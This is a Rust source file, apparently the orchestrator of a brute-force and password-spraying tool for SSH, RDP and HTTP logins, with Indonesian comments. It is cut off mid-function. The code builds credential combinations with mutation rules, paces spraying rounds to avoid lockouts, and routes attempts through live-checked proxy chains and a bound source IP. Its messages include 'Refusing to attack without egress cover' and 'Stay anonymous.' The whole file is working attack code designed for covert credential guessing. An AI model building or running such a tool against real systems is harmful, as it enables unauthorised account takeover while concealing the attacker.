use crate::utils::fx_map::DedupSet;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use chrono::Utc;
use colored::Colorize;
use futures::future::join_all;
use tokio::sync::{Semaphore, mpsc};

use super::cidr::expand_targets;
use super::config::AttackConfig;
use super::credential::Credential;
use super::credential_stream::{CredentialStream, ExpandMode};
use super::error::AttackError;
use super::metrics::AttackMetrics;
use super::planner::AttackPlan;
use super::result::{AttackSummary, AuthResult, ProgressTick};
use super::rules::{apply_rules, load_rules};
use super::target::{parse_targets, Target};
use super::wordlist::{load_combo_list, load_wordlist};
use super::worker::{WorkerPool, WorkerTask};
use crate::proxy::{load_proxy_list, ProxyConfig};
use crate::utils::output::OutputHandler;
use crate::utils::ratelimit::{JitterDelay, KeyedThrottle, RateLimiter, SprayCadence};
use crate::utils::report::save_html_report;
use crate::protocols::{http, rdp};
use crate::utils::resume::SessionState;

pub struct AttackOrchestrator {
    config: AttackConfig,
    targets: Vec<Target>,
    credentials: Vec<Credential>,
    proxies: Vec<ProxyConfig>,
    results: Vec<AuthResult>,
    session: Option<SessionState>,
    output: OutputHandler,
    rate_limiter: RateLimiter,
    jitter: JitterDelay,
    // F4.1/F4.2: limiter per-target, per-user, dan cadence spray round.
    target_throttle: KeyedThrottle,
    user_throttle: KeyedThrottle,
    spray_cadence: SprayCadence,
    // F6.1/F6.4: identitas run + hook progres API.
    run_id: String,
    progress_tx: Option<mpsc::UnboundedSender<ProgressTick>>,
    running: Arc<AtomicBool>,
}

impl AttackOrchestrator {
    pub async fn new(config: AttackConfig, running: Arc<AtomicBool>) -> Result<Self, AttackError> {
        config.validate()?;

        // F6.1: run_id unik per eksekusi, dipakai skema JSON v2 + API + report.
        let run_id = uuid::Uuid::new_v4().to_string();
        let output = OutputHandler::new(
            config.output_format.clone(),
            config.output_file.as_deref(),
            config.verbose as u8,
            &run_id,
            config.show_secrets,
        )?;

        if let Some(ref domain) = config.rdp_domain {
            rdp::set_domain(domain);
        }
        if let Some(ref v) = config.http_userfield {
            http::set_form_userfield(v);
        }
        if let Some(ref v) = config.http_passfield {
            http::set_form_passfield(v);
        }
        if let Some(ref v) = config.http_success {
            http::set_form_success(v);
        }
        // F4.4: override UA global (first-wins per proses, sama seperti globals http lain).
        crate::protocols::transport::set_user_agent_override(config.user_agent.clone());
        // ANON: egress source IP global untuk semua socket baru.
        crate::protocols::tcp::set_source_ip(config.source_ip);
        if let Some(ip) = config.source_ip {
            log::info!("Egress source IP bound to {}", ip);
        }

        // F4.1: throttle per-target dari --target-rate-limit (min interval),
        // per-user dari --user-cooldown.
        let target_throttle = match config.target_rate_limit {
            Some(n) if n > 0 => KeyedThrottle::new(std::time::Duration::from_secs_f64(1.0 / n as f64)),
            _ => KeyedThrottle::disabled(),
        };
        let user_throttle = KeyedThrottle::new(config.user_cooldown);
        let spray_cadence = SprayCadence::new(config.spray_interval, config.spray_jitter_pct);

        Ok(AttackOrchestrator {
            targets: Vec::new(),
            credentials: Vec::new(),
            proxies: Vec::new(),
            results: Vec::new(),
            session: None,
            output,
            rate_limiter: RateLimiter::new(config.rate_limit),
            jitter: JitterDelay::new(config.delay, config.delay_jitter_ms),
            target_throttle,
            user_throttle,
            spray_cadence,
            run_id,
            progress_tx: None,
            config,
            running,
        })
    }

    pub fn run_id(&self) -> &str {
        &self.run_id
    }

    /// Hook progres untuk job queue non-blocking API (F6.4).
    /// Dipanggil sebelum run(); tick dikirim tiap batch drain.
    pub fn set_progress_hook(&mut self, tx: mpsc::UnboundedSender<ProgressTick>) {
        self.progress_tx = Some(tx);
    }

    pub async fn load_targets_for_distributed(config: &AttackConfig) -> Result<Vec<Target>, AttackError> {
        let dns_semaphore = Arc::new(Semaphore::new(50));
        Self::resolve_targets(config, dns_semaphore).await
    }

    pub async fn load_credentials_for_distributed(config: &AttackConfig) -> Result<Vec<Credential>, AttackError> {
        Self::load_credentials(config).await
    }

    async fn load_targets(config: &AttackConfig) -> Result<Vec<Target>, AttackError> {
        let dns_semaphore = Arc::new(Semaphore::new(50));
        Self::resolve_targets(config, dns_semaphore).await
    }

    async fn resolve_targets(config: &AttackConfig, dns_semaphore: Arc<Semaphore>) -> Result<Vec<Target>, AttackError> {
        let mut target_strings: Vec<String> = Vec::new();

        if let Some(file_path) = &config.target_file {
            let file_targets = load_wordlist(file_path).await?;
            target_strings.extend(file_targets);
        }

        let mut expanded: Vec<(String, Option<u16>)> = Vec::new();
        for spec in &config.targets {
            let hosts = expand_targets(&[spec.clone()]);
            expanded.extend(hosts);
        }
        for (host, port_opt) in &expanded {
            if let Some(p) = port_opt {
                target_strings.push(format!("{}:{}", host, p));
            } else {
                target_strings.push(host.clone());
            }
        }

        let protocols: Vec<String> = if config.protocols.is_empty() {
            vec!["ssh".to_string()]
        } else {
            config.protocols.clone()
        };

        let ports: Vec<u16> = if config.ports.is_empty() {
            crate::protocols::default_ports_for_protocols(&protocols)
        } else {
            config.ports.clone()
        };

        let mut targets = parse_targets(&target_strings, &protocols, &ports);

        let before = targets.len();
        let mut seen: DedupSet<(String, u16, String)> = DedupSet::with_capacity(targets.len());
        targets.retain(|t| seen.insert((t.host.clone(), t.port, t.protocol.clone())));
        if targets.len() < before {
            log::info!("Removed {} duplicate targets", before - targets.len());
        }

        let resolve_futures: Vec<_> = targets.iter_mut().map(|t| {
            let timeout = config.timeout;
            let permit = Arc::clone(&dns_semaphore);
            async move {
                let _guard = permit.acquire().await;
                if !t.is_resolved() {
                    let _ = t.resolve(timeout).await;
                }
            }
        }).collect();
        join_all(resolve_futures).await;

        targets.retain(|t| t.is_resolved());
        if targets.is_empty() {
            return Err(AttackError::config("No valid targets after DNS resolution"));
        }

        log::info!("Loaded {} targets ({} after expansion+dns)", config.targets.len(), targets.len());
        Ok(targets)
    }

    async fn load_credentials(config: &AttackConfig) -> Result<Vec<Credential>, AttackError> {
        let mut credentials = Vec::new();

        if let Some(combo_path) = &config.combo_file {
            let combos = load_combo_list(combo_path).await?;
            let combo_count = combos.len();
            for (user, pass) in combos {
                credentials.push(Credential::new(user, pass));
            }
            println!("  {} {} {}",
                "Combo file:".bold().cyan(),
                combo_count.to_string().white(),
                "user:pass pairs loaded".dimmed(),
            );
            return Ok(credentials);
        }

        let mut users: Vec<String> = Vec::new();
        let mut user_sources = Vec::new();
        if !config.users.is_empty() {
            let count = config.users.len();
            users.extend(config.users.clone());
            user_sources.push(format!("{} individual", count));
        }
        if let Some(user_path) = &config.user_file {
            let file_users = load_wordlist(user_path).await?;
            let count = file_users.len();
            users.extend(file_users);
            user_sources.push(format!("{} from {:?}", count, user_path));
        }
        if users.is_empty() {
            return Err(AttackError::config("No users provided"));
        }

        let mut passwords: Vec<String> = Vec::new();
        let mut pass_sources = Vec::new();
        if !config.passwords.is_empty() {
            let count = config.passwords.len();
            passwords.extend(config.passwords.clone());
            pass_sources.push(format!("{} individual", count));
        }
        if let Some(pass_path) = &config.password_file {
            let base_passwords = load_wordlist(pass_path).await?;
            let base_count = base_passwords.len();
            let expanded = if let Some(rule_path) = &config.rule_file {
                if Path::new(rule_path).exists() {
                    match load_rules(rule_path) {
                        Ok(rules) => {
                            log::info!("Loaded {} mutation rules from {:?}", rules.len(), rule_path);
                            let mutated = apply_rules(&base_passwords, &rules, config.max_mutations);
                            log::info!("Expanded {} passwords to {} via rules", base_count, mutated.len());
                            pass_sources.push(format!("{} raw → {} mutated from {:?}", base_count, mutated.len(), pass_path));
                            mutated
                        }
                        Err(e) => {
                            log::warn!("Failed to load rules: {}. Using base passwords.", e);
                            pass_sources.push(format!("{} from {:?} (rules failed)", base_count, pass_path));
                            base_passwords
                        }
                    }
                } else {
                    pass_sources.push(format!("{} from {:?}", base_count, pass_path));
                    base_passwords
                }
            } else {
                pass_sources.push(format!("{} from {:?}", base_count, pass_path));
                base_passwords
            };
            passwords.extend(expanded);
        }
        if passwords.is_empty() {
            return Err(AttackError::config("No passwords provided"));
        }

        credentials = build_credentials(config, &users, &passwords);
        println!();
        println!("  {} {} {}",
            "Users:".bold().cyan(),
            users.len().to_string().white().bold(),
            format!("({})", user_sources.join(" + ")).dimmed(),
        );
        println!("  {} {} {}",
            "Passwords:".bold().cyan(),
            passwords.len().to_string().white().bold(),
            format!("({})", pass_sources.join(" + ")).dimmed(),
        );
        println!("  {} {} {}",
            "Combinations:".bold().green(),
            credentials.len().to_string().white().bold(),
            format!("({} users × {} passwords)", users.len(), passwords.len()).yellow(),
        );
        Ok(credentials)
    }

    fn load_proxies(config: &AttackConfig) -> Vec<ProxyConfig> {
        let mut proxies = Vec::new();
        if let Some(proxy_path) = &config.proxy_file {
            match load_proxy_list(proxy_path) {
                Ok(p) => proxies = p,
                Err(e) => log::warn!("Failed to load proxies: {}", e),
            }
        }
        if let Some(ref single_proxy) = config.proxy {
            if let Ok(p) = ProxyConfig::parse(single_proxy) {
                proxies.push(p);
            }
        }
        if let Some(ref chain) = config.proxy_chain {
            let chain_proxies: Vec<ProxyConfig> = chain.split(',')
                .map(|s| s.trim())
                .filter(|s| !s.is_empty())
                .filter_map(|s| ProxyConfig::parse(s).ok())
                .collect();
            if chain_proxies.len() > 1 {
                proxies.push(ProxyConfig::Chain { proxies: chain_proxies });
            } else if let Some(p) = chain_proxies.into_iter().next() {
                proxies.push(p);
            }
        }
        proxies
    }

    /// ANON A3: pre-flight liveness concurrent untuk semua proxy terkonfigurasi
    /// (5 dtk per proxy). Mati dibuang + warn; bila SEMUA mati → fail-closed.
    /// `strict` (--check-proxy): abort bila ADA SATUPUN yang mati.
    async fn preflight_proxies(
        proxies: Vec<ProxyConfig>,
        strict: bool,
    ) -> Result<Vec<ProxyConfig>, AttackError> {
        if proxies.is_empty() {
            return Ok(proxies);
        }
        let checks: Vec<_> = proxies
            .iter()
            .map(|p| p.check_liveness(std::time::Duration::from_secs(5)))
            .collect();
        let outcomes = futures::future::join_all(checks).await;
        let mut alive = Vec::new();
        let mut dead = Vec::new();
        for (proxy, outcome) in proxies.into_iter().zip(outcomes) {
            match outcome {
                Ok(note) => {
                    log::info!("proxy alive: {}", note);
                    alive.push(proxy);
                }
                Err(e) => {
                    // display() tidak memuat kredensial — aman di-log.
                    log::warn!("proxy dead, dropped: {}", e);
                    dead.push(proxy.display());
                }
            }
        }
        if alive.is_empty() {
            return Err(AttackError::config(format!(
                "All {} configured prox(ies) unreachable ({}). Refusing to attack without egress cover.",
                dead.len(),
                dead.join(", ")
            )));
        }
        if strict && !dead.is_empty() {
            return Err(AttackError::config(format!(
                "--check-proxy strict: {} of {} prox(ies) dead: {}",
                dead.len(),
                alive.len() + dead.len(),
                dead.join(", ")
            )));
        }
        if !dead.is_empty() {
            log::warn!("preflight: {}/{} proxies alive", alive.len(), alive.len() + dead.len());
        }
        Ok(alive)
    }

    pub async fn dry_run_preview(config: &AttackConfig) -> Result<AttackPlan, AttackError> {
        config.validate()?;
        // Estimasi target tanpa DNS: expand CIDR/range + parse + dedup.
        let mut target_strings: Vec<String> = Vec::new();
        if let Some(ref fp) = config.target_file {
            if let Ok(lines) = super::wordlist::load_wordlist_mmap(fp) {
                target_strings.extend(lines);
            }
        }
        let mut expanded_count = 0usize;
        for spec in &config.targets {
            expanded_count += expand_targets(&[spec.clone()]).len().max(1);
        }
        let file_targets = if config.target_file.is_some() {
            target_strings.len()
        } else {
            0
        };
        let target_estimate = (expanded_count + file_targets).max(1);

        // Estimasi kredensial tanpa mutasi penuh: hitung baris file + direct.
        let mut user_count = config.users.len() as u64;
        if let Some(ref fp) = config.user_file {
            user_count += count_lines_fast(fp).unwrap_or(0);
        }
        let mut pass_count = config.passwords.len() as u64;
        if let Some(ref fp) = config.password_file {
            pass_count += count_lines_fast(fp).unwrap_or(0);
        }
        // F8.1: dry-run HARUS memperhitungkan ekspansi --rule agar estimasi
        // akurat (estimasi tanpa ekspansi = undercount brutal untuk audit).
        let mut rule_note: Option<String> = None;
        if config.rule_file.is_some() && config.combo_file.is_none() && pass_count > 0 {
            if let Some(ref rp) = config.rule_file {
                match super::rules::load_rules(rp) {
                    Ok(rules) if !rules.is_empty() => {
                        let est = super::rules::dry_count_rules(
                            pass_count as usize,
                            &rules,
                            config.max_mutations,
                        ) as u64;
                        rule_note = Some(format!(
                            "{} rule(s) expand {} base -> {} estimated (cap {})",
                            rules.len(),
                            pass_count,
                            est,
                            config.max_mutations
                        ));
                        pass_count = est.max(1);
                    }
                    Ok(_) => {}
                    Err(e) => {
                        rule_note = Some(format!("rules unloadable ({}), estimate is base only", e));
                    }
                }
            }
        }
        let cred_estimate = if let Some(ref fp) = config.combo_file {
            count_lines_fast(fp).unwrap_or(0).max(1)
        } else if config.single_user_mode {
            pass_count.max(1)
        } else if config.user_file.is_none() && config.password_file.is_none() {
            // Path cepat tanpa file: pakai lazy stream agar konsisten dengan runtime.
            CredentialStream::new(
                config.users.clone(),
                config.passwords.clone(),
                expand_mode_for(config),
            )
            .estimate_total()
            .max(1)
        } else {
            user_count.max(1) * pass_count.max(1)
        };

        Ok(AttackPlan::new(
            target_estimate,
            cred_estimate,
            config.threads,
            config.timeout,
            config.rate_limit,
        ).with_note(rule_note.unwrap_or_default()))
    }

    pub async fn run(&mut self) -> AttackSummary {
        let protocol_name = self.config.protocols.first().map(|s| s.as_str()).unwrap_or("unknown");
        let start_time = Utc::now();

        // Fase 1: dry-run keluar sebelum network I/O apapun.
        if self.config.dry_run {
            match Self::dry_run_preview(&self.config).await {
                Ok(mut plan) => {
                    // ANON: jujur — dry-run tidak menyentuh proxy sama sekali.
                    if self.config.proxy.is_some()
                        || self.config.proxy_file.is_some()
                        || self.config.proxy_chain.is_some()
                    {
                        let extra = "proxy configured but NOT liveness-checked in dry-run (no packets sent)";
                        plan.note = if plan.note.is_empty() {
                            extra.to_string()
                        } else {
                            format!("{} | {}", plan.note, extra)
                        };
                    }
                    println!();
                    println!("  {} dry run, no packets sent", "DRY RUN:".bold().yellow());
                    println!("{}", plan.render());
                    println!();
                }
                Err(e) => {
                    log::error!("Dry run failed: {}", e);
                }
            }
            return empty_summary(start_time);
        }

        let targets = match Self::load_targets(&self.config).await {
            Ok(mut t) => {
                let before = t.len();
                if before > 10 {
                    let sem = Arc::new(Semaphore::new(50));
                    let mut handles = Vec::with_capacity(before);
                    for target in t {
                        let permit = Arc::clone(&sem);
                        let addr = target.cached_addr.clone();
                        let timeout_dur = std::time::Duration::from_secs(3);
                        handles.push(async move {
                            let _guard = permit.acquire().await;
                            match crate::protocols::tcp::connect_bound(&addr, timeout_dur).await {
                                Ok(stream) => { drop(stream); Some(target) }
                                _ => None,
                            }
                        });
                    }
                    t = futures::future::join_all(handles).await.into_iter().filter_map(|x| x).collect();
                    let dead = before - t.len();
                    if dead > 0 {
                        log::info!("Health check: {} targets alive, {} unreachable (skipped)", t.len(), dead);
                    }
                }
                t
            }
            Err(e) => {
                log::error!("Failed to load targets: {}", e);
                return empty_summary(start_time);
            }
        };
        self.targets = targets;

        // F5.3: batasi ke port terbuka dari file hasil scan terakhir.
        if let Some(ref open_path) = self.config.only_open {
            match load_only_open(open_path) {
                Ok(open) => {
                    let before = self.targets.len();
                    self.targets
                        .retain(|t| open.contains(&(t.host.clone(), t.port)));
                    let dropped = before - self.targets.len();
                    log::info!(
                        "only-open: {} targets kept, {} dropped (not in {})",
                        self.targets.len(),
                        dropped,
                        open_path.display()
                    );
                    if self.targets.is_empty() {
                        log::error!(
                            "only-open filtered out all targets; nothing to attack."
                        );
                        return empty_summary(start_time);
                    }
                }
                Err(e) => {
                    log::error!("Failed to load --only-open file: {}", e);
                    return empty_summary(start_time);
                }
            }
        }

        let credentials = match Self::load_credentials(&self.config).await {
            Ok(c) => c,
            Err(e) => {
                log::error!("Failed to load credentials: {}", e);
                return empty_summary(start_time);
            }
        };
        self.credentials = credentials;
        self.proxies = Self::load_proxies(&self.config);
        // ANON A3: jangan serang lewat proxy mati.
        match Self::preflight_proxies(std::mem::take(&mut self.proxies), self.config.check_proxy).await {
            Ok(alive) => self.proxies = alive,
            Err(e) => {
                log::error!("Proxy preflight failed: {}", e);
                return empty_summary(start_time);
            }
        }
        // ANON A5: DNS-leak honesty — nama host di-resolve oleh resolver LOKAL
        // (trust-dns sistem), bukan lewat proxy. Siapa pun yang melihat DNS
        // (resolver, network lokal) tahu KEMANA Anda menyerang, walau isi
        // traffic tertutup proxy. Mitigasi: pakai IP literal, atau Tor dengan
        // DNSPort + --proxy ke Tor.
        if !self.proxies.is_empty() {
            let hostnames: Vec<&str> = self
                .targets
                .iter()
                .map(|t| t.host.as_str())
                .filter(|h| h.parse::<std::net::IpAddr>().is_err())
                .collect();
            if !hostnames.is_empty() {
                let shown: Vec<&&str> = hostnames.iter().take(5).collect();
                log::warn!(
                    "DNS-leak note: {} target hostname(s) resolved LOCALLY (not via proxy): {:?}{}. Contents are proxied, destinations are not.",
                    hostnames.len(),
                    shown,
                    if hostnames.len() > 5 { " ..." } else { "" }
                );
            }
        }

        let cred_before_dedup = self.credentials.len();
        let mut seen: DedupSet<(String, String)> = DedupSet::with_capacity(self.credentials.len());
        self.credentials.retain(|c| seen.insert((c.username.clone(), c.password.clone())));
        let dedup_removed = cred_before_dedup - self.credentials.len();
        if dedup_removed > 0 {
            log::info!("Removed {} duplicate credential pairs", dedup_removed);
        }

        if let Some(resume_path) = &self.config.resume_file {
            match SessionState::load(resume_path) {
                Ok(state) => self.session = Some(state),
                Err(e) => log::warn!("Cannot load resume file (starting fresh): {}", e),
            }
        }

        let total_combinations = self.targets.len() * self.credentials.len();
        log::info!("Starting attack: {} targets × {} credentials = {} total combinations",
            self.targets.len(), self.credentials.len(), total_combinations);

        println!();
        println!("  {} {} {} {} {} {}",
            "Targets:".bold().cyan(),
            self.targets.len().to_string().white(),
            "×".dimmed(),
            "Credentials:".bold().cyan(),
            self.credentials.len().to_string().white(),
            format!("= {} total attempts", total_combinations).yellow().bold(),
        );
        println!();

        // F6.4: job API (quiet) tidak membuat dashboard progres ke stdout server.
        if !self.config.quiet {
            self.output.init_dashboard(
                protocol_name,
                self.targets.len(),
                self.credentials.len(),
            );
        }

        self.output.set_status(format!("Brute-forcing {} targets × {} credentials ({} total)",
            self.targets.len(), self.credentials.len(), total_combinations));

        let mut pool = WorkerPool::new(&self.config, Arc::clone(&self.running), self.proxies.clone());
        let (result_tx, mut result_rx): (mpsc::UnboundedSender<AuthResult>, _) = mpsc::unbounded_channel();

        let target_count = self.targets.len();
        let cred_count = self.credentials.len();
        let mut attempt_count = 0u64;
        let mut successes_global = 0u64;
        let mut failures_global = 0u64;
        let mut errors_global = 0u64;
        let mut last_prompted_count = 0u64;

        // ── Always-on anti-duplicate: hashed, hemat memori untuk jutaan pasangan ──
        let mut tested_creds = crate::utils::fx_map::HashedPairDedup::with_capacity(
            self.credentials.len().min(1_000_000),
        );
        if let Some(ref session) = self.session {
            for c in &self.credentials {
                if session.is_tested(&c.username, &c.password) {
                    tested_creds.insert_hash(super::wordlist::hash_credential_pair(
                        &c.username,
                        &c.password,
                    ));
                }
            }
        }
        let mut stop_early = false;
        let mut metrics = AttackMetrics::new();

        fn ordinal(n: u64) -> String {
            match n {
                1 => "First".to_string(),
                2 => "Second".to_string(),
                3 => "Third".to_string(),
                4 => "Fourth".to_string(),
                5 => "Fifth".to_string(),
                6 => "Sixth".to_string(),
                7 => "Seventh".to_string(),
                8 => "Eighth".to_string(),
                9 => "Ninth".to_string(),
                10 => "Tenth".to_string(),
                _ => format!("#{}", n),
            }
        }

        fn drain_results(
            result_rx: &mut mpsc::UnboundedReceiver<AuthResult>,
            output: &mut OutputHandler,
            results: &mut Vec<AuthResult>,
            session: &mut Option<SessionState>,
            successes_global: &mut u64,
            failures_global: &mut u64,
            errors_global: &mut u64,
            metrics: &mut AttackMetrics,
        ) -> bool {
            let mut found_success = false;
            loop {
                match result_rx.try_recv() {
                    Ok(result) => {
                        let timeout = result
                            .error
                            .as_deref()
                            .map(|e| {
                                let l = e.to_lowercase();
                                l.contains("timeout") || l.contains("timed out")
                            })
                            .unwrap_or(false);
                        metrics.record_attempt(
                            result.duration_ms,
                            result.success,
                            timeout,
                            result.error.is_some() && !result.success,
                        );
                        // F4.7: teruskan sinyal lockout/rate-limit ke dashboard live.
                        let cat = crate::utils::patterns::classify_error(
                            result.error.as_deref(),
                            result.success,
                        )
                        .category;
                        output.note_signal(&cat);
                        if result.success {
                            *successes_global += 1;
                            found_success = true;
                            if let Some(ref mut s) = session {
                                s.mark_tested(&result.username, &result.password);
                                s.add_success(&result.target_host, &result.protocol, &result.username, &result.password);
                            }
                            output.on_result(&result);
                            results.push(result);
                        } else {
                            if result.error.is_some() {
                                *errors_global += 1;
                            } else {
                                *failures_global += 1;
                            }
                            if let Some(ref mut s) = session {
                                s.mark_tested(&result.username, &result.password);
                            }
                            output.on_result(&result);
                            results.push(result);
                        }
                    }
                    Err(tokio::sync::mpsc::error::TryRecvError::Empty) => break,
                    Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => break,
                }
            }
            found_success
        }

        // ── prompt: suspend progress bars, print, read stdin, resume bars ──
        fn prompt_sync(count: u64, _multi: &indicatif::MultiProgress) -> bool {
            use std::io::Write;
            let ord = ordinal(count);
            _multi.suspend(|| {
                println!();
                println!("  {} {} {}",
                    format!("{} credential FOUND!", ord).green().bold(),
                    format!("(total found: {})", count).white(),
                    "Continue attacking? [y/N]:".white().bold(),
                );
                print!("  >> ");
                let _ = std::io::stdout().flush();
                let mut input = String::new();
                let _ = std::io::stdin().read_line(&mut input);
                input.trim().to_lowercase() == "y" || input.trim().to_lowercase() == "yes"
            })
        }

        // ── fallback prompt when no dashboard ──
        fn prompt_plain_sync(count: u64) -> bool {
            use std::io::Write;
            let ord = ordinal(count);
            println!();
            println!("  {} {} {}",
                format!("{} credential FOUND!", ord).green().bold(),
                format!("(total found: {})", count).white(),
                "Continue attacking? [y/N]:".white().bold(),
            );
            print!("  >> ");
            let _ = std::io::stdout().flush();
            let mut input = String::new();
            let _ = std::io::stdin().read_line(&mut input);
            input.trim().to_lowercase() == "y" || input.trim().to_lowercase() == "yes"
        }

        async fn check_and_prompt(
            stop_early: &mut bool,
            successes_global: u64,
            last_prompted_count: &mut u64,
            config: &AttackConfig,
            multi: Option<&indicatif::MultiProgress>,
        ) -> bool {
            if successes_global <= *last_prompted_count { return true; }
            *last_prompted_count = successes_global;
            if config.stop_on_first {
                *stop_early = true;
                log::info!("stop-on-first enabled, halting after first success");
                return false;
            }
            // --yes: jangan pernah prompt, sikat semua kombinasi sampai habis.
            if config.no_prompt {
                log::info!(
                    "credential #{} found, continuing to end of list (--yes)",
                    successes_global
                );
                return true;
            }
            // Non-interaktif (pipe/file/CI): stdin bukan TTY → read_line akan
            // EOF dan TERJEMAHKAN sebagai "tidak" sehingga attack berhenti di
            // tengah. Auto-lanjut agar run selalu tuntas sampai akhir.
            if !std::io::IsTerminal::is_terminal(&std::io::stdin()) {
                log::info!(
                    "credential #{} found, continuing to end of list (non-interactive stdin)",
                    successes_global
                );
                return true;
            }
            let answer = match multi {
                Some(m) => tokio::task::block_in_place(|| prompt_sync(successes_global, m)),
                None => prompt_plain_sync(successes_global),
            };
            if !answer {
                *stop_early = true;
                log::info!("User requested stop after {} successes", successes_global);
                return false;
            }
            true
        }

        let plan = AttackPlan::new(
            self.targets.len(),
            self.credentials.len() as u64,
            self.config.threads,
            self.config.timeout,
            self.config.rate_limit,
        );
        let mut batch_size = plan.batch_size;
        log::info!(
            "Plan: {} targets x {} creds, mode {:?}, start batch {}",
            plan.targets,
            plan.credentials,
            expand_mode_for(&self.config),
            batch_size
        );
        let mut batch_submitted = 0usize;
        let mut status_counter = 0usize;

        let multi: Option<indicatif::MultiProgress> = self.output.dashboard.as_ref().map(|d| d.multi().clone());
        let arc_targets: Vec<Arc<Target>> = self.targets.iter().map(|t| Arc::new(t.clone())).collect();
        let arc_credentials: Vec<Arc<Credential>> = self.credentials.iter().map(|c| Arc::new(c.clone())).collect();

        // F4.2: satu spray round = tiap user dicoba sekali untuk satu password,
        // di semua target. Tidur cadence setiap round selesai.
        let spray_round_size: usize = if self.config.spray_mode && self.spray_cadence.is_enabled() {
            let mut users = std::collections::HashSet::new();
            for c in &self.credentials {
                users.insert(c.username.as_str());
            }
            users.len().saturating_mul(target_count).max(1)
        } else {
            0
        };
        let mut spray_submitted: usize = 0;
        let mut spray_round: u64 = 0;

        'outer: for t_idx in 0..target_count {
            let target = &arc_targets[t_idx];
            for c_idx in 0..cred_count {
                if !self.running.load(Ordering::SeqCst) || stop_early {
                    break 'outer;
                }

                let credential = &arc_credentials[c_idx];
                // Always-on anti-duplicate via hash
                let h = super::wordlist::hash_credential_pair(
                    &credential.username,
                    &credential.password,
                );
                if tested_creds.contains_hash(h) {
                    attempt_count += 1;
                    self.output.inc_progress();
                    continue;
                }
                tested_creds.insert_hash(h);

                self.rate_limiter.wait_if_needed().await;
                self.jitter.delay().await;
                // F4.1: limiter per-target dan per-user di atas limiter global.
                self.target_throttle
                    .wait(&format!("{}:{}", target.host, target.port))
                    .await;
                self.user_throttle.wait(&credential.username).await;

                if status_counter & 3 == 0 {
                    self.output.set_status(format!("{}:{} -> {}:{}",
                        target.host, target.port,
                        credential.username, credential.password));
                }
                status_counter += 1;

                pool.submit_with_sender(WorkerTask {
                    target: Arc::clone(target),
                    credential: Arc::clone(credential),
                }, result_tx.clone());

                attempt_count += 1;
                self.output.inc_progress();
                batch_submitted += 1;

                // F4.2: jeda antar spray round agar tidak menekan satu akun bertubi-tubi.
                if spray_round_size > 0 {
                    spray_submitted += 1;
                    if spray_submitted % spray_round_size == 0 {
                        spray_round += 1;
                        self.spray_cadence.wait_round(spray_round).await;
                    }
                }

                if batch_submitted >= batch_size {
                    let found = drain_results(
                        &mut result_rx, &mut self.output, &mut self.results,
                        &mut self.session,
                        &mut successes_global, &mut failures_global,
                        &mut errors_global,
                        &mut metrics,
                    );
                    batch_submitted = 0;
                    // F6.4: tick progres untuk job API non-blocking.
                    if let Some(ref tx) = self.progress_tx {
                        let _ = tx.send(ProgressTick {
                            attempts: attempt_count,
                            successes: successes_global,
                            failures: failures_global,
                            errors: errors_global,
                        });
                    }
                    // Fase 1: batch adaptif berdasarkan timeout ratio.
                    let tuned = metrics.suggested_batch(batch_size);
                    if tuned != batch_size {
                        log::info!(
                            "Adaptive batch {} -> {} ({})",
                            batch_size,
                            tuned,
                            metrics.summary_line()
                        );
                        batch_size = tuned;
                    }
                    if found && !check_and_prompt(
                        &mut stop_early, successes_global,
                        &mut last_prompted_count,
                        &self.config, multi.as_ref(),
                    ).await {
                        self.running.store(false, Ordering::SeqCst);
                        break 'outer;
                    }
                }
            }

            // Drain & prompt after each target's credentials
            if batch_submitted > 0 {
                let found = drain_results(
                    &mut result_rx, &mut self.output, &mut self.results,
                    &mut self.session,
                    &mut successes_global, &mut failures_global,
                    &mut errors_global,
                    &mut metrics,
                );
                batch_submitted = 0;
                if found && !check_and_prompt(
                    &mut stop_early, successes_global,
                    &mut last_prompted_count,
                    &self.config, multi.as_ref(),
                ).await {
                    self.running.store(false, Ordering::SeqCst);
                    break 'outer;
                }
            }
        }

        // Drain remaining results or fast-exit on user stop
        if stop_early {
            drop(result_tx);
            pool.shutdown();
            if let Some(ref dashboard) = self.output.dashboard {
                dashboard.clear_bars();
            }
            println!();
            println!("  {}",
                "Goodbye. Stay anonymous.".green().italic(),
            );
            println!();
        } else {
            drop(result_tx);
            pool.wait_complete().await;
            drain_results(
                &mut result_rx, &mut self.output, &mut self.results,
                &mut self.session,
                &mut successes_global, &mut failures_global,
                &mut errors_global,
                &mut metrics,
            );
            log::info!("Final metrics: {}", metrics.summary_line());
        }

        if let Some(ref session) = self.session {
            if let Some(ref resume_path) = self.config.resume_file {
                let _ = session.save(resume_path);
            }
        }

        let end_time = Utc::now();
        let duration = end_time.signed_duration_since(start_time).to_std().unwrap_or_default();
        let summary = AttackSummary {
            run_id: self.run_id.clone(),
            start_time,
            end_time: Some(end_time),
            total_targets: self.targets.len(),
            total_credentials: self.credentials.len(),
            attempts: attempt_count,
            successes: successes_global,
            failures: failures_global,
            errors: errors_global,
            results: self.results.clone(),
            total_duration: Some(duration),
        };

        self.output.finish(&summary);

        if matches!(self.config.output_format, crate::core::config::OutputFormat::Html) {
            if let Some(ref output_path) = self.config.output_file {
                let html_path = if output_path.extension().map_or(true, |e| e != "html") {
                    output_path.with_extension("html")
                } else {
                    output_path.clone()
                };
                if let Err(e) = save_html_report(&html_path, &summary, self.config.show_secrets) {
                    log::error!("Failed to save HTML report: {}", e);
                } else {
                    log::info!("HTML report saved to {}", html_path.display());
                }
            }
        }

        summary
    }
}

fn empty_summary(start_time: chrono::DateTime<Utc>) -> AttackSummary {
    AttackSummary {
        run_id: String::new(),
        start_time,
        end_time: Some(Utc::now()),
        total_targets: 0,
        total_credentials: 0,
        attempts: 0,
        successes: 0,
        failures: 0,
        errors: 0,
        results: vec![],
        total_duration: Some(std::time::Duration::ZERO),
    }
}

fn build_credentials(config: &AttackConfig, users: &[String], passwords: &[String]) -> Vec<Credential> {
    let mut credentials = Vec::with_capacity(users.len() * passwords.len());
    let max_len = config.max_password_len.unwrap_or(usize::MAX);
    if config.spray_mode {
        for pass in passwords {
            for user in users {
                credentials.push(Credential::new(user.clone(), truncate_password(pass, max_len)));
            }
        }
    } else if config.single_user_mode {
        if let Some(user) = users.first() {
            for pass in passwords {
                credentials.push(Credential::new(user.clone(), truncate_password(pass, max_len)));
            }
        }
    } else {
        for user in users {
            for pass in passwords {
                credentials.push(Credential::new(user.clone(), truncate_password(pass, max_len)));
            }
        }
    }
    credentials
}

fn truncate_password(s: &str, max_len: usize) -> String {
